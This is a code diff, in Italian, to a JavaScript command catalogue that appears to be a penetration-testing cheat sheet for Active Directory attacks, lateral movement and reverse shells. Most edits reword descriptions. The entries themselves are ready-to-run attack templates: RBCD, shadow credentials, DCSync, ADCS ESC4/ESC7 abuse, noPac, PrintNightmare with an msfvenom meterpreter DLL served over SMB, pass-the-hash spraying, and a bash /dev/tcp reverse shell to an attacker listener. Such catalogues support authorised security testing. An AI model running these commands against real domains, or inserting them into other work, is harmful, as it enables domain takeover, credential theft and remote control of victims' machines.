+    "description": "Crea un computer account controllato dall'attaccante sfruttando il MachineAccountQuota, che di default consente a ogni utente di dominio di aggiungerne fino a dieci. Il nuovo account, di cui si conosce la password, è il prerequisito del Resource-Based Constrained Delegation, dove serve un principal con SPN da impersonare.",
+    "note": "# Quota esaurita\n`Machine account quota exceeded` significa che i dieci slot sono già occupati. In quel caso si riusa un computer account esistente di cui si controlli la password, oppure si abbassa la quota se si hanno i diritti.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9504,7 +9909,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (RBCD)",
-    "description": "Scrive `msDS-AllowedToActOnBehalfOfOtherIdentity` sulla vittima: il tuo computer potrà impersonare chiunque verso di essa (poi `getST -impersonate`).",
+    "description": "Scrive `msDS-AllowedToActOnBehalfOfOtherIdentity` sulla vittima, così il computer account controllato potrà impersonare chiunque verso di essa tramite `getST -impersonate`.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9554,7 +9959,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ACL Abuse",
-    "description": "Con `GenericWrite`/`GenericAll` sul target (attributo `msDS-KeyCredentialLink`), aggiungi una tua chiave e ottieni il suo NT hash via PKINIT, senza resettargli la password. `shadow auto` fa tutto da solo: aggiunta, auth, NT hash e pulizia.",
+    "description": "Con `GenericWrite` o `GenericAll` sull'attributo `msDS-KeyCredentialLink` del target si aggiunge una chiave propria e se ne ottiene l'NT hash via PKINIT, senza resettare la password dell'utente. `shadow auto` svolge tutto da solo: aggiunta, autenticazione, NT hash e pulizia.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9614,7 +10019,7 @@ const COMMANDS = [
         "description": "Come sopra ma via Kerberos (`-k`, usa il ccache): utile se NTLM è disabilitato."
       }
     ],
-    "note": "# pywhisker (passi separati)\nSe vuoi più controllo (add → TGT → NT hash → cleanup):\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py ... --action remove --device-id <id>`",
+    "note": "# pywhisker (passi separati)\nQuando serve maggiore controllo sulla sequenza di aggiunta, TGT, NT hash e cleanup:\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py ... --action remove --device-id <id>`",
     "refs": [
       {
         "label": "Certipy — GitHub",
@@ -9628,7 +10033,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "LDAP",
-    "description": "Se hai il diritto di lettura (ACL), leggi la password admin locale (LAPS) o la password gestita di un gMSA. Spesso è un salto diretto ad admin locale o a un account di servizio.",
+    "description": "Con il diritto di lettura concesso dall'ACL si ricava la password di amministratore locale gestita da LAPS oppure la password di un gMSA. Spesso è un salto diretto ad amministratore locale o a un account di servizio.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9685,7 +10090,7 @@ const COMMANDS = [
         "id": "gmsa",
         "label": "gMSA (nxc)",
         "template": "nxc ldap <dc> -u '<user>' -p '<password>' --gmsa",
-        "description": "Password dei gMSA dove sei in `msDS-GroupMSAMembership` (richiede LDAPS)."
+        "description": "Password dei gMSA per cui l'account corrente compare in `msDS-GroupMSAMembership`. Richiede LDAPS."
       },
       {
         "id": "bloodyad",
@@ -9701,7 +10106,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (Unconstrained)",
-    "description": "Con SYSTEM su una macchina con unconstrained delegation: monitori i TGT in arrivo, coerci il DC ad autenticarsi verso di te, catturi il suo TGT e fai DCSync. Enumera prima con `Get-DomainComputer -Unconstrained`.",
+    "description": "Con SYSTEM su una macchina con unconstrained delegation il flusso è: monitoraggio dei TGT in arrivo, coercizione del DC ad autenticarsi verso quella macchina, cattura del suo TGT e infine DCSync. L'enumerazione preliminare si fa con `Get-DomainComputer -Unconstrained`.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -9759,7 +10164,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (Constrained)",
-    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali forgi un ticket come Administrator tramite S4U2Self+S4U2Proxy e accedi al servizio. Enumera con `Get-DomainUser -TrustedToAuth`.",
+    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali si forgia un ticket come Administrator tramite S4U2Self e S4U2Proxy, ottenendo accesso al servizio. L'enumerazione si fa con `Get-DomainUser -TrustedToAuth`.",
     "platform": "cross-platform",
     "requires": [
       "password",
@@ -9843,7 +10248,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "DCSync",
-    "description": "Con i diritti di replica (DA, o concessi via WriteDACL) estrai gli hash dal DC senza toccarlo. `-just-dc-ntlm` per i soli NTLM, `-just-dc-user` per un utente.",
+    "description": "Simula la replica fra domain controller per estrarre gli hash direttamente dal DC, senza eseguire codice su di esso. Richiede i diritti di replica, che appartengono a Domain Admins e agli account su cui sono stati concessi via WriteDACL. `-just-dc-ntlm` preleva i soli hash NTLM, `-just-dc-user <utente>` limita a un singolo account come krbtgt.",
     "platform": "linux",
     "requires": [
       "password",
@@ -9958,7 +10363,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "persistence",
     "group": "Ticket Forgery",
-    "description": "Forgia un service ticket come un altro utente (catena S4U2Self+S4U2Proxy) verso un SPN del target: passo finale di RBCD/Constrained Delegation.",
+    "description": "Forgia un service ticket a nome di un altro utente tramite la catena S4U2Self e S4U2Proxy, indirizzato a uno specifico SPN del target. È il passo finale sia del Resource-Based Constrained Delegation sia della delega vincolata classica: con il ticket in mano si accede al servizio come l'utente impersonato, tipicamente Administrator verso CIFS o HOST.",
+    "note": "# Uso del ticket\ngetST salva un file `.ccache`. Va esportato con `export KRB5CCNAME=Administrator.ccache` prima di lanciare psexec o wmiexec con l'opzione `-k -no-pass`.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10008,7 +10414,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "PowerView",
-    "description": "Enumerazione AD da Windows in memoria. Trova candidati Kerberoast (`-SPN`), ASREPRoast (`-PreauthNotRequired`), ACL sfruttabili e dove sei admin locale.",
+    "description": "Enumerazione AD da Windows, eseguita in memoria. Individua i candidati Kerberoast con `-SPN`, quelli ASREPRoast con `-PreauthNotRequired`, le ACL sfruttabili e le macchine su cui l'account corrente è amministratore locale.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -10069,7 +10475,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC4/7",
-    "description": "Altri abusi ADCS oltre `ESC1`. `ESC4`: hai diritti di scrittura sul template → lo riscrivi come `ESC1` (poi RIPRISTINA!). `ESC7`: hai Manage CA → ti aggiungi Officer e abiliti il template `SubCA`.",
+    "description": "Altri abusi ADCS oltre a `ESC1`. Con `ESC4` i diritti di scrittura sul template permettono di riscriverlo come `ESC1`, con ripristino obbligatorio a fine attività. Con `ESC7` il permesso Manage CA permette di aggiungersi come Officer e abilitare il template `SubCA`.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10137,7 +10543,7 @@ const COMMANDS = [
         "id": "esc7",
         "label": "ESC7 (Manage CA)",
         "template": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
-        "description": "Ti aggiungi Officer, abiliti SubCA, richiedi (va in pending), la emetti come Officer e recuperi il cert."
+        "description": "Aggiunge l'account come Officer, abilita SubCA, invia la richiesta che resta in pending, la emette sfruttando il ruolo di Officer e infine recupera il certificato."
       }
     ]
   },
@@ -10147,7 +10553,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "GPO Abuse",
-    "description": "Se hai diritti di scrittura su una GPO, aggiungiti come admin locale su tutte le macchine nel suo scope, o piazza uno scheduled task come SYSTEM. Poi `gpupdate /force`.",
+    "description": "I diritti di scrittura su una GPO permettono di aggiungere l'account come amministratore locale su tutte le macchine nel suo scope, oppure di piazzare uno scheduled task come SYSTEM. Serve poi un `gpupdate /force`.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -10192,7 +10598,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "CVE",
-    "description": "Con un qualsiasi account di dominio (e `MAQ > 0`) ottieni SYSTEM sul DC sfruttando l’incoerenza sAMAccountName. `-shell` per una shell, `-dump` per DCSync diretto.",
+    "description": "Un qualsiasi account di dominio, con `MAQ > 0`, permette di ottenere SYSTEM sul DC sfruttando l'incoerenza sAMAccountName. `-shell` apre una shell, `-dump` esegue direttamente il DCSync.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10264,7 +10670,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "CVE",
-    "description": "Se il Print Spooler del DC è attivo, carichi una DLL malevola via MS-RPRN e ottieni esecuzione come SYSTEM sul DC. Verifica prima che il servizio risponda, poi ospita la DLL su una share SMB.",
+    "description": "Con il Print Spooler del DC attivo si carica una DLL malevola via MS-RPRN ottenendo esecuzione come SYSTEM sul domain controller. Il servizio va prima verificato e la DLL ospitata su una share SMB.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10321,7 +10727,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Exploit (cube0x0)",
         "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\nsudo smbserver.py -smb2support share ./\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
-        "description": "Generi la DLL, la ospiti via SMB e la esegui come SYSTEM sul DC."
+        "description": "Genera la DLL, la ospita via SMB e la esegue come SYSTEM sul DC."
       }
     ],
     "refs": [
@@ -10337,7 +10743,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ACL Abuse",
-    "description": "Con `WriteDACL` sul dominio concediti i diritti di replica (DCSync) col tuo account, poi estrai gli hash. Ricorda di rimuovere il diritto dopo (cleanup).",
+    "description": "Il permesso WriteDACL sull'oggetto dominio consente di modificare la sua ACL e di concedere all'account controllato i due diritti di replica, DS-Replication-Get-Changes e DS-Replication-Get-Changes-All, che abilitano il DCSync. È un percorso di escalation frequente nei path di BloodHound. Il diritto concesso va rimosso a fine attività.",
+    "note": "# Cleanup obbligatorio\nI diritti di replica lasciati su un utente normale sono un finding critico e una backdoor: `bloodyAD ... remove dcsync <user>` li rimuove una volta estratti gli hash.",
     "platform": "linux",
     "requires": [
       "password"
@@ -10553,7 +10960,7 @@ const COMMANDS = [
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
-    "description": "Crea un servizio su `ADMIN$` ed esegue come SYSTEM. Affidabile ma rumoroso (scrive su disco e crea un servizio). Serve admin locale sul target.",
+    "description": "Crea un servizio temporaneo sulla share `ADMIN$` ed esegue come SYSTEM sul target. È il metodo più affidabile per una shell piena, ma anche il più rumoroso, perché scrive un binario su disco e registra un servizio, entrambi eventi che gli EDR intercettano. Richiede privilegi di amministratore locale sul target.",
     "platform": "linux",
     "requires": [
       "password",
@@ -10614,7 +11021,7 @@ const COMMANDS = [
     "category": "lateral",
     "subcategory": "remote-shells",
     "group": "Impacket Shells",
-    "description": "Esegue via DCOM/WMI senza installare servizi né scrivere su disco: più silenzioso di psexec.",
+    "description": "Esegue comandi via WMI e DCOM senza installare un servizio né scrivere sul disco, il che lo rende molto più silenzioso di psexec e meno rilevato dagli EDR. Il prezzo è una shell semi-interattiva che lancia un comando per volta invece di una sessione piena. Funziona con password, hash NTLM o ticket Kerberos.",
     "platform": "linux",
     "requires": [
       "password",
@@ -10845,7 +11252,7 @@ const COMMANDS = [
     "category": "lateral",
     "subcategory": "pass-the-hash",
     "group": "PtH",
-    "description": "Spruzza un NTLM hash su una lista di target per trovare dove l’utente è admin locale. `--local-auth` per account locali (riuso password admin locale).",
+    "description": "Spruzza un hash NTLM su una lista di target per individuare dove l'utente è amministratore locale, senza mai conoscere la password. Un `(Pwn3d!)` accanto a un host indica accesso amministrativo. `--local-auth` è necessario per gli account locali, il cui riuso della stessa password admin fra macchine è ancora molto comune.",
     "platform": "linux",
     "requires": [
       "hash"
@@ -11124,7 +11531,7 @@ const COMMANDS = [
         "id": "remote",
         "label": "Remote (-R)",
         "template": "ssh -R <localport>:127.0.0.1:<targetport> <user>@<pivot> -N",
-        "description": "Espone una tua porta locale sul pivot."
+        "description": "Espone una porta locale dell'attaccante sul pivot."
       },
       {
         "id": "dynamic",
@@ -11352,7 +11759,7 @@ const COMMANDS = [
     "category": "utilities",
     "subcategory": "reverse-shells",
     "group": "One-liner",
-    "description": "One-liner pronti per richiamare il tuo listener. Per altre lingue/encoding usa revshells.com. Stabilizza poi la shell (vedi Exploitation).",
+    "description": "One-liner pronti per richiamare il listener dell'attaccante. Per altri linguaggi ed encoding il riferimento è revshells.com. La shell va poi stabilizzata, come descritto nella fase Exploitation.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -11380,7 +11787,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Bash",
         "template": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
-        "description": "Richiede `/dev/tcp` (bash). Lancia da `bash -c`."
+        "description": "Richiede `/dev/tcp`, quindi bash, e va lanciato tramite `bash -c`."
       },
       {
         "id": "python",
